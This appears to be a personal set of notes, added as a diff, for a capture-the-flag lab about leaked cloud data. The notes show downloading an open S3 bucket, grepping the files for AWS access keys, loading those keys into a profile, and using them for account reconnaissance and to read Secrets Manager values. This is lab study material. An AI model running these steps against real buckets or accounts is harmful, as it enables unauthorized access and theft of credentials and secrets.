@@ -1,3 +1,50 @@
+AWS cloud cmd
+#Key Takeaway
+1) right click the image if the png contain aws bucketname link 
+2) personally i jus bruteforce the web /flag.txt because it was inside the bucket 
+alternative with cmd aws
+the link was 
+                                                                                                           s3.[amazonaws.com->/]/images.bestfestivalcompany.com/flag.txt  turn into cmd
+aws s3 [commnad eg. ls ,cat(cannot just cat if wan open file need to cp to local then cat on local ),cp]cp s3://images.bestfestivalcompany.com/ .(copy to local) --no-sign-request
+
+
+3)once on local find the file with "AKIA"
+CAT * | grep AKIA or grep -r "AKIA" (RECURSIVELY FIND IN LOCAL WITH AKIA WORD)
+FOUND IT 
+
+4)create profile 
+aws configure --profile osas
+enter access key in wp-config
+cd ..
+u find .aws directory because u have aws profile
+cd .aws
+ls
+u see config credentials (all access key and credentials store here)
+
+5)
+ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to. 
+A few other common AWS reconnaissance techniques are:
+aws s3 ls --profile PROFILENAME
+aws sts get-access-key-info --access-key-id AKIAEXAMPLE                                    Finding the Account ID belonging to an access key:
+aws sts get-caller-identity --profile PROFILENAME                                          Determining the Username the access key you're using belongs to
+aws ec2 describe-instances --output text --profile PROFILENAME                             Listing all the EC2 instances running in an account
+aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME          Listing all the EC2 instances running in an account in a different region
+
+now the hardest database secret
+aws secretsmanager help
+aws secretsmanager list-secrets --profile osas  (show u the secret name or arn)
+aws secretsmanager get-secret-value  --secret-id <SECRET_NAME_OR_ARN>  --profile osas --region eu-north-1
+
+
+
+
+
+
+
+
+
+
+
 Task 22
 [Day 17] Cloud Elf Leaks
 ﻿﻿﻿﻿In a move to taunt the Best Festival Company, Grinch Enterprises sends out an email to the entire company with everyone's name and date of birth. McSkidy looks quite stressed with the breach and thinks about the potential legal consequences. She talks to McInfra to try to determine the origin of the breach.
